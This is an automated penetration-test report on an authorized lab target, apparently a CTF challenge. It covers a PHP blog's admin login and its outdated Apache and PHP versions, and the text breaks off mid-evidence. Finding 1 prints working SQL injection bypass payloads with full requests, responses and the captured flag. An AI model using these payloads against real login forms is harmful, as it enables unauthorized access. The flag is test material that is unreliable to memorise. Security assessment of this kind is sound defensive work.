# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — sqli SQL injection authentication bypass in /admin.php login (username field)](#finding-1)
    - [2. HIGH — vulnerable-component Outdated Apache httpd 2.4.54 (Debian) — multiple known CVEs (e.g. CVE-2023-25690 request smuggling, CVE-2024-38476 SSRF)](#finding-2)
    - [3. HIGH — vulnerable-component End-of-life PHP 7.4.33 — unsupported branch, unpatched CVE-2023-3824 (phar overflow → RCE) & CVE-2023-3823 (XXE)](#finding-3)
    - [4. LOW — info-disclosure PHP error notices leak server path and language on every page load](#finding-4)
    - [5. INFO — burp Path-relative style sheet import (3 URLs)](#finding-5)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqy35fig-jneldy` |
| Target | http://target.local:32821/ |
| Started | 2026-06-28T17:51:33.299Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 4 mapped · 4 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 5 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32821`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

5 finding(s): 1 critical, 2 high, 1 low, 1 info

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [sqli] SQL injection authentication bypass in /admin.php login (username field)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32821/

The admin login at POST /admin.php builds its SQL query by concatenating the unsanitized `username` POST parameter. A single quote (`username='`) breaks the query, producing a PHP error (`Trying to get property 'num_rows' of non-object in /var/www/html/admin.php on line 24`), confirming the value is interpolated directly into SQL. A boolean-tautology / comment payload in `username` (e.g. `admin' OR '1'='1`, `admin'--`, `' OR 1=1--`) makes the query return rows, authenticating the request without valid credentials. The bypassed response omits the "Invalid username or password." error and discloses an admin secret: `flag{c969819d-7a14-4c90-b85d-51eccd232580}`. Impact: full authentication bypass + sensitive data disclosure with no credentials.

**Reproduction**

```
1. Negative control (injection that does NOT authenticate): POST /admin.php body `username='&password=x` → 200, 831 bytes, PHP SQL error + "Invalid username or password.", NO flag (ev-mqy3ckgv-g).
2. Bypass (replay 1): POST `username=admin' OR '1'='1&password=x` → 200, 688 bytes, no error, body begins with `flag{c969819d-7a14-4c90-b85d-51eccd232580}` (ev-mqy3clwt-h).
3. Bypass (replay 2): POST `username=admin'-- &password=x` → identical flag response (ev-mqy3cndd-i).
4. Bypass (replay 3): POST `username=' OR 1=1-- &password=x` → identical flag response (ev-mqy3co61-j).
Additional control: wrong credentials `username=nonexistentuser_zzz&password=wrongpass_zzz` → 200, 702 bytes, "Invalid username or password.", no flag (ev-mqy3cada-f).
```

**Evidence**

- Evidence `ev-mqy3ckgv-g` — `artifacts/s-0002/ev-mqy3ckgv-g/`

Request:

```http
POST /admin.php HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=%27&password=x
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 831
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 17:57:06 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

<br />
<b>Notice</b>:  Trying to get property 'num_rows' of non-object in <b>/var/www/html/admin.php</b> on line <b>24</b><br />

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Admin Login</h1>
    <p style='color: red;'>Invalid username or password.</p>    <form action="admin.php" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <button type="submit">Login</button>
    </form>
</div>
</body>
</html>
```

- Evidence `ev-mqy3clwt-h` — `artifacts/s-0002/ev-mqy3clwt-h/`

Request:

```http
POST /admin.php HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=admin%27+OR+%271%27%3D%271&password=x
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 688
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 17:57:07 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

flag{c969819d-7a14-4c90-b85d-51eccd232580}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Admin Login</h1>
        <form action="admin.php" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <button type="submit">Login</button>
    </form>
</div>
</body>
</html>
```

- Evidence `ev-mqy3cndd-i` — `artifacts/s-0002/ev-mqy3cndd-i/`

Request:

```http
POST /admin.php HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=admin%27--+&password=x
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 688
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 17:57:09 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=98
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

flag{c969819d-7a14-4c90-b85d-51eccd232580}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Admin Login</h1>
        <form action="admin.php" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <button type="submit">Login</button>
    </form>
</div>
</body>
</html>
```

- Evidence `ev-mqy3co61-j` — `artifacts/s-0002/ev-mqy3co61-j/`

Request:

```http
POST /admin.php HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=%27+OR+1%3D1--+&password=x
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 688
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 17:57:10 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=97
pragma: no-cache
server: Apache/2.4.54 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.4.33

flag{c969819d-7a14-4c90-b85d-51eccd232580}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Admin Login</h1>
        <form action="admin.php" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <button type="submit">Login</button>
    </form>
</div>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [vulnerable-component] Outdated Apache httpd 2.4.54 (Debian) — multiple known CVEs (e.g. CVE-2023-25690 request smuggling, CVE-2024-38476 SSRF)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32821/

VERSION-BASED finding (matched by banner, not exploited). The server identifies itself as `Apache/2.4.54 (Debian)` via the `Server` response header (confirmed independently by fingerprint_scan and by the ServerSignature in the 404 page footer: "Apache/2.4.54 (Debian) Server at ... Port 32821"). Apache httpd 2.4.54 was released 2022-06-08 and is superseded by many security releases. Known CVEs fixed AFTER 2.4.54 that therefore affect this version include: CVE-2023-25690 (HTTP request smuggling via mod_proxy + certain RewriteRule/ProxyPassMatch configs, CVSS 9.8 — fixed 2.4.56); CVE-2024-38476 (backend response headers can drive SSRF / local handler invocation / info disclosure, CVSS 9.8 — fixed 2.4.60); CVE-2024-38474/38475 (mod_rewrite encoding → source disclosure / potential code execution — fixed 2.4.60); CVE-2024-27316 (HTTP/2 CONTINUATION-flood memory-exhaustion DoS — fixed 2.4.59); CVE-2023-31122 (mod_macro out-of-bounds read — fixed 2.4.58); CVE-2022-36760/CVE-2022-37436 (mod_proxy_ajp / mod_proxy response splitting & smuggling — fixed 2.4.55). The most severe are critical (9.8) but their exploitability is module/config-dependent (require mod_proxy / mod_rewrite / mod_http2 to be enabled and configured a particular way), which is why this is rated high rather than critical and is reported as version-based. Operator action: confirm enabled modules/config, then upgrade to a current 2.4.x (>= 2.4.62 at time of writing). Also consider suppressing ServerTokens/ServerSignature to stop leaking the exact build.

**Reproduction**

```
1. GET http://target.local:32821/ → 200, response carries `Server: Apache/2.4.54 (Debian)` (ev-mqy3r4iy-1r). 2. Repeat GET / → identical 200, same banner (stable) (ev-mqy3r4iy-1r / ev-mqy3r58w-1s on /index.php). 3. The 404 page (GET a non-existent path) footer also prints `Apache/2.4.54 (Debian) Server at target.local Port 32821`, re-confirming the exact build (ev-mqy3r65a-1t). Map the version to the post-2.4.54 CVE list above.
```

**Evidence**

- Evidence `ev-mqy3r65a-1t` — `artifacts/_/ev-mqy3r65a-1t/`

Request:

```http
GET /verdict-nonexistent-path-xyz-404 HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 18:08:27 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.54 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at target.local Port 32821</address>
</body></html>
```

- Evidence `ev-mqy3r4iy-1r` — `artifacts/_/ev-mqy3r4iy-1r/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5666
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:08:25 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```

- Evidence `ev-mqy3r58w-1s` — `artifacts/_/ev-mqy3r58w-1s/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5666
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:08:26 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [HIGH] [vulnerable-component] End-of-life PHP 7.4.33 — unsupported branch, unpatched CVE-2023-3824 (phar overflow → RCE) & CVE-2023-3823 (XXE)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32821/

VERSION-BASED finding (matched by banner, not exploited). The application exposes `X-Powered-By: PHP/7.4.33` (and a `PHPSESSID` cookie) on its responses. PHP 7.4.33 (released 2022-11-03) is the FINAL release of the PHP 7.4 branch, which reached End-of-Life on 2022-11-28 — it receives NO further security updates. Beyond the general EOL exposure, concrete CVEs disclosed after 7.4's EOL were fixed only in supported 8.x branches and never backported to 7.4: CVE-2023-3824 (buffer overflow / use-after-free in PHAR directory-entry parsing → memory disclosure and potential remote code execution, CVSS ~9.4); CVE-2023-3823 (external-entity loading in PHP's XML handling → local file disclosure / SSRF-style info disclosure, CVSS 8.6); plus later 8.x fixes such as CVE-2024-2756 (__Host-/__Secure- cookie spoofing) and CVE-2024-5458 (filter_var URL-validation bypass) that 7.4 will never receive. NOTE: CVE-2024-4577 (php-cgi argument-injection RCE) is Windows-locale-specific and is most likely NOT applicable to this Debian host. Severity high: the branch is unsupported AND has an unpatched RCE-class CVE (CVE-2023-3824), though neither was actively exploited here. Operator action: migrate to a supported PHP release (8.2/8.3+). Also disable `expose_php` (stop emitting X-Powered-By) — note the same pages leak `Notice: Undefined variable ... in /var/www/html/index.php`, indicating display_errors is on, which compounds the EOL exposure.

**Reproduction**

```
1. GET http://target.local:32821/ → 200; response header `X-Powered-By: PHP/7.4.33` and `Set-Cookie: PHPSESSID=...` (ev-mqy3r4iy-1r). 2. GET http://target.local:32821/index.php → identical 200 with the same `X-Powered-By: PHP/7.4.33` (ev-mqy3r58w-1s) — stable across requests. 3. Negative control: GET a non-existent path → 404 with a different body (ev-mqy3r65a-1t). Map PHP 7.4.33 to the EOL date (2022-11-28) and the unpatched CVE list above.
```

**Evidence**

- Evidence `ev-mqy3r65a-1t` — `artifacts/_/ev-mqy3r65a-1t/`

Request:

```http
GET /verdict-nonexistent-path-xyz-404 HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 18:08:27 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.54 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at target.local Port 32821</address>
</body></html>
```

- Evidence `ev-mqy3r4iy-1r` — `artifacts/_/ev-mqy3r4iy-1r/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5666
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:08:25 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```

- Evidence `ev-mqy3r58w-1s` — `artifacts/_/ev-mqy3r58w-1s/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5666
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:08:26 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
